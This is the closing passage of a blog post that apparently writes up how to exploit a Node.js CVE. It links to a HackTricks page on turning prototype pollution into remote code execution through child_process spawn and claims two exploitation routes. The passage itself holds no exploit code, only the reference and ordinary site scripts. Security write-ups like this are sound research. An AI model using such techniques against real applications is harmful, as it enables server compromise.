<a href=https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#spawn-exploitation>https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#spawn-exploitation</a></p><p>Because it use <strong>spawn</strong> of <strong>child_process</strong> that i show before</p><p>And that application will f* up :)))))))</p><p>So, i show you 2 ways to exploit with that CVE, kkkk</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/m%E1%BB%99t-line-regex-c%C6%A1-b%E1%BA%A3n-v%C3%A0-m%C3%ACnh-%C4%91%C3%A3-ki%E1%BA%BFm--nh%C6%B0-th%E1%BA%BF-n%C3%A0o/><span class=title>« Prev</span><br><span>Một line Regex cơ bản và mình đã kiếm $$$$$ như thế nào</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=http://localhost:1313/>ancorn_</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>